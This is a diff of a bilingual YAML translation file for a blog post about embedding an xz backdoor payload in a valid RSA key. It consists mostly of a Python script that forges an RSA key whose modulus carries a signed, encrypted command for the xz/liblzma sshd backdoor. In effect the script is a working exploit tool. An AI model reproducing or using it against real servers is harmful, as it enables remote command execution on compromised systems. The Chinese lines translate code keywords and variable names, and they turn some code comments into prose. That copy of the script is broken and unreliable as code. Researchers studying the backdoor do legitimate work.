@@ -2,28 +2,34 @@
   id: totrans-split-0
   prefs: []
   type: TYPE_NORMAL
+  zh: <!--yml
 - en: 'category: 未分类'
   id: totrans-split-1
   prefs: []
   type: TYPE_NORMAL
+  zh: 'category: 未分类'
 - en: 'date: 2024-05-27 12:52:19'
   id: totrans-split-2
   prefs: []
   type: TYPE_NORMAL
+  zh: 'date: 2024-05-27 12:52:19'
 - en: -->
   id: totrans-split-3
   prefs: []
   type: TYPE_NORMAL
+  zh: -->
 - en: Putting an xz Backdoor Payload in a Valid RSA Key | rya.nc
   id: totrans-split-4
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 把一个 xz 后门有效负载放在一个有效的 RSA 密钥中 | rya.nc
 - en: 来源：[https://rya.nc/xz-valid-n.html](https://rya.nc/xz-valid-n.html)
   id: totrans-split-5
   prefs:
   - PREF_BQ
   type: TYPE_NORMAL
+  zh: 来源：[https://rya.nc/xz-valid-n.html](https://rya.nc/xz-valid-n.html)
 - en: '1`#!/usr/bin/env python3`23`# python standard library imports`4`from os import
     urandom`5`from sys import argv, exit, stderr`67`from hashlib import sha256`8`from
     base64 import b64decode as b64d`9`from struct import pack_into, unpack_from`1011`#
@@ -43,8 +49,24 @@
     7) // 8, byteorder=''big'')`37 `# a leading zero byte is needed if first bit is
     1`38 `if i_bytes[0] >= 0x80: '
   id: totrans-split-6
-  prefs: &id001 []
+  prefs: []
   type: TYPE_NORMAL
+  zh: '1`#!/usr/bin/env python3`23`# Python 标准库导入`4`from os import urandom`5`from
+    sys import argv, exit, stderr`67`from hashlib import sha256`8`from base64 import
+    b64decode as b64d`9`from struct import pack_into, unpack_from`1011`# 第三方库导入`12`from
+    gmpy2 import mpz, next_prime, invert, lcm, gcd, c_div`1314`# 我不怕地雷、龙或激光枪恐龙`15`from
+    cryptography.hazmat.primitives.asymmetric.rsa import generate_private_key as rsa_generate`16`from
+    cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateNumbers, RSAPublicNumbers`17`from
+    cryptography.hazmat.primitives.asymmetric.ed448 import Ed448PrivateKey`1819`from
+    cryptography.hazmat.primitives.ciphers.algorithms import ChaCha20`20`from cryptography.hazmat.primitives.ciphers
+    import Cipher`2122`from cryptography.hazmat.primitives.serialization import PrivateFormat,
+    PublicFormat`23`from cryptography.hazmat.primitives.serialization import Encoding,
+    NoEncryption`24`# 结束导入`2526`COMMAND = 2`27`RSA_BITS, RSA_E = 2048, mpz(65537)`2829`#
+    将数据拼接到类似字节值的值中，返回新的 `bytes` 值`30`def replace_at(orig, replace, offset):`31 `return
+    bytes(orig[0:offset] + replace + orig[offset+len(replace):])`3233`# 整数转换为以两位补码大端值编码为
+    `bytearray``34`def int_to_bytearray(i):`35 `i = int(i)`36 `i_bytes = i.to_bytes((i.bit_length()
+    + 7) // 8, byteorder=''big'')`37 `# 如果第一个比特位为 1，则需要一个前导零字节`38 `if i_bytes[0] >=
+    0x80: '
 - en: 'i_bytes = b''\0'' + i_bytes`3940 `return bytearray(i_bytes)`4142`# newer versions
     of gmpy2 have this natively :-/`43`def mpz_from_bytes(b, byteorder=''big'', *,
     signed=False):`44 `return mpz(int.from_bytes(b, byteorder, signed=signed))`4546`#
@@ -53,13 +75,20 @@
     *probable* prime`5152`# construct rsa private key given (n, e, d, p, q)`53`def
     rsa_construct(n, e, d, p, q):`54 `# p should be greater than q`55 `if q > p: '
   id: totrans-split-7
-  prefs: *id001
+  prefs: []
   type: TYPE_NORMAL
+  zh: 'i_bytes = b''\0'' + i_bytes`3940 `return bytearray(i_bytes)`4142`# 新版本的 gmpy2
+    本地支持这个功能 :-/`43`def mpz_from_bytes(b, byteorder=''big'', *, signed=False):`44
+    `return mpz(int.from_bytes(b, byteorder, signed=signed))`4546`# 随机素数，n 字节长`47`def
+    random_prime(n):`48 `rand_bytes = urandom(n)`49 `rand_start = mpz_from_bytes(rand_bytes)`50
+    `return next_prime(rand_start) # 下一个 *可能的* 素数`5152`# 给定 (n, e, d, p, q) 构造 RSA
+    私钥`53`def rsa_construct(n, e, d, p, q):`54 `# p 应该大于 q`55 `if q > p:'
 - en: 'p, q = q, p`5657 `# compute chinese remainder theorem values`58 `dmp1, dmq1
     = map(lambda x: '
   id: totrans-split-8
-  prefs: *id001
+  prefs: []
   type: TYPE_NORMAL
+  zh: 'p, q = q, p`5657 `# 计算中国剩余定理的值`58 `dmp1, dmq1 = map(lambda x: '
 - en: 'int(d % (x - 1)), (p, q))`59 `iqmp = int(invert(q, p))`6061 `# build the key
     from parameters`62 `n, e, d, p, q = map(int, (n, e, d, p, q))`63 `pub_params =
     RSAPublicNumbers(e, n)`64 `prv_params = RSAPrivateNumbers(p, q, d, dmp1, dmq1,
@@ -80,8 +109,25 @@
     64 characters'', file=stderr)`99 `exit(1)`100101`# command needs to be at least
     five bytes for signing, pad as required`102`while len(command) < 5: '
   id: totrans-split-9
-  prefs: *id001
+  prefs: []
   type: TYPE_NORMAL
+  zh: '`int(d % (x - 1)), (p, q))`59 `iqmp = int(invert(q, p))`6061 `# 从参数构建密钥`62
+    `n, e, d, p, q = map(int, (n, e, d, p, q))`63 `pub_params = RSAPublicNumbers(e,
+    n)`64 `prv_params = RSAPrivateNumbers(p, q, d, dmp1, dmq1, iqmp, pub_params)`65
+    `return prv_params.private_key()`6667`# pem格式未加密的私钥`68`def pem_private(k):`69
+    `return k.private_bytes(`70 `Encoding.PEM, PrivateFormat.TraditionalOpenSSL, NoEncryption()`71
+    `).decode().strip()`7273`# 以与https://github.com/amlweems/xzbot相同的方式生成密钥`74`def
+    ed448_from_n(n):`75 `seed = n.to_bytes(57, byteorder=''big'')`76 `return Ed448PrivateKey.from_private_bytes(seed)`7778`#
+    使用原始ChaCha20进行加密/解密`79`def chacha20(data, key, nonce):`80 `cipher = Cipher(ChaCha20(key,
+    nonce), mode=None)`81 `cryptor = cipher.encryptor()`82 `return cryptor.update(data)`8384`#
+    处理服务器私钥`85`srv_pub_type = argv[1].encode()`86`srv_pub_type = len(srv_pub_type).to_bytes(4,
+    ''big'') + srv_pub_type`87`srv_pub_body = b64d(argv[2])`88`srv_pub_hash = sha256(srv_pub_type
+    + srv_pub_body).digest()`8990`# 生成后门密钥`91`prv_key = ed448_from_n(int(argv[3]))`92`pub_key
+    = prv_key.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw)`93`sym_key
+    = pub_key[0:32]`9495`# 命令以空字符终止`96`command = argv[4].encode() + b''\0''`97`if
+    len(command) > 64:`98 `print(''command too long, should not exceed 64 characters'',
+    file=stderr)`99 `exit(1)`100101`# 命令至少需要五个字节进行签名，根据需要进行填充`102`while len(command)
+    < 5: '
 - en: 'command += b''\0''`103104`# the first few bytes of an rsa modulus probably
     aren''t uniformly distributed,`105`# so start off with an N value from a normally
     generated key`106`rsa = rsa_generate(int(RSA_E), RSA_BITS)`107`n = rsa.private_numbers().public_numbers.n`108`n_bytes
@@ -96,18 +142,31 @@
     16)`129`n = mpz_from_bytes(n_bytes)`130131`# We''ll choose a new prime `p` randomly,
     then divide the modulus to get a new`132`# `q`. '
   id: totrans-split-10
-  prefs: *id001
+  prefs: []
   type: TYPE_NORMAL
+  zh: '`command += b''\0''`103104`# RSA模数的前几个字节可能不是均匀分布的，`105`# 因此从通常生成的密钥的N值开始`106`rsa
+    = rsa_generate(int(RSA_E), RSA_BITS)`107`n = rsa.private_numbers().public_numbers.n`108`n_bytes
+    = int_to_bytearray(n)`109110`# xz后门预检字段`111`cmd1, cmd2 = unpack_from(''<LL'',
+    n_bytes, 0)`112`cmd3 = ((2**64 + COMMAND) - cmd1 * cmd2) % 2**64`113`pack_into(''<Q'',
+    n_bytes, 8, cmd3)`114115`# 构建有效负载`116`hdr_magic = b''\2\0\0\0''`117`hdr_flags
+    = b''\0\0\0\0''`118`hdr_ukwn1 = b''\0''`119`hdr_cslen = bytes([len(command)])`120`hdr_ukwn2
+    = b''\0''`121`header = hdr_magic + hdr_flags + hdr_ukwn1 + hdr_cslen + hdr_ukwn2`122`to_sign
+    = bytes(header + command + srv_pub_hash)`123`signature = prv_key.sign(to_sign)`124`plaintext
+    = signature + command`125`ciphertext = chacha20(plaintext, sym_key, n_bytes[:16])`126127`#
+    将有效负载拼接到模数`128`n_bytes = replace_at(n_bytes, ciphertext, 16)`129`n = mpz_from_bytes(n_bytes)`130131`#
+    我们将随机选择一个新的素数`p`，然后分解模数以获得新的`132`# `q`。'
 - en: 'With this process the lowest bits of the modulus corrosponding to the`133`#
     size (plus a few) of `p` get scrambled while the upper bits of the modulus`134`#
     remain fixed. '
   id: totrans-split-11
-  prefs: *id001
+  prefs: []
   type: TYPE_NORMAL
+  zh: 通过此过程，与`133`#大小（加上几个）的`p`相对应的模数的最低位会被打乱，而模数的`134`#上位位保持不变。
 - en: 'The size of `p` is chosen here such that our payload is kept.`135`# NOTE: '
   id: totrans-split-12
-  prefs: *id001
+  prefs: []
   type: TYPE_NORMAL
+  zh: 选择`135`#此处`p`的大小，以保持有效负载。
 - en: 'The security level of the key scales down with the size of `p`.`136`p_bytes
     = min((RSA_BITS // 8 - 17) - len(ciphertext), RSA_BITS // 16)`137138`# generate
     p, q to produce the evil modulus`139`tries = 0`140`while True:`141 `p = random_prime(p_bytes)`142
@@ -115,17 +174,27 @@
     `good = 0`147 `for i in range(len(ciphertext)):`148 `if n_payload_bytes[16+i]
     == ciphertext[i]: '
   id: totrans-split-13
-  prefs: *id001
+  prefs: []
   type: TYPE_NORMAL
+  zh: '密钥的安全级别随着`p`的大小而降低。`136`p_bytes = min((RSA_BITS // 8 - 17) - len(ciphertext),
+    RSA_BITS // 16)`137138`# 生成p、q以产生恶意模数`139`尝试次数 = 0`140`while True:`141 `p = random_prime(p_bytes)`142
+    `q = next_prime(c_div(n, p))`143 `n_payload = p * q`144 `n_payload_bytes = int_to_bytearray(n_payload)`145146
+    `good = 0`147 `for i in range(len(ciphertext)):`148 `if n_payload_bytes[16+i]
+    == ciphertext[i]: '
 - en: 'good += 1`149 `else: '
   id: totrans-split-14
-  prefs: *id001
+  prefs: []
   type: TYPE_NORMAL
+  zh: 'good += 1`149 `else: '
 - en: break`150151 `if good == len(ciphertext):`152 `# parameter validation`153 `totient
     = lcm(p - 1, q - 1)`154 `if gcd(totient, RSA_E) == 1:`155 `# compute private exponent`156
     `d = invert(RSA_E, totient)`157158 `rsa = rsa_construct(n_payload, RSA_E, d, p,
     q)`159 `break`160161 `if tries := tries + 1 > 100:`162 `print('failed to generate
     key', file=stderr)`163 `exit(1)`164165`print(pem_private(rsa))`
   id: totrans-split-15
-  prefs: *id001
+  prefs: []
   type: TYPE_NORMAL
+  zh: break`150151 `if good == len(ciphertext):`152 `# 参数验证`153 `欧拉函数 = lcm(p - 1,
+    q - 1)`154 `if gcd(欧拉函数, RSA_E) == 1:`155 `# 计算私钥指数`156 `d = invert(RSA_E, 欧拉函数)`157158
+    `rsa = rsa_construct(n_payload, RSA_E, d, p, q)`159 `break`160161 `如果 tries :=
+    tries + 1 > 100:`162 `print('failed to generate key', file=stderr)`163 `exit(1)`164165`print(pem_private(rsa))`
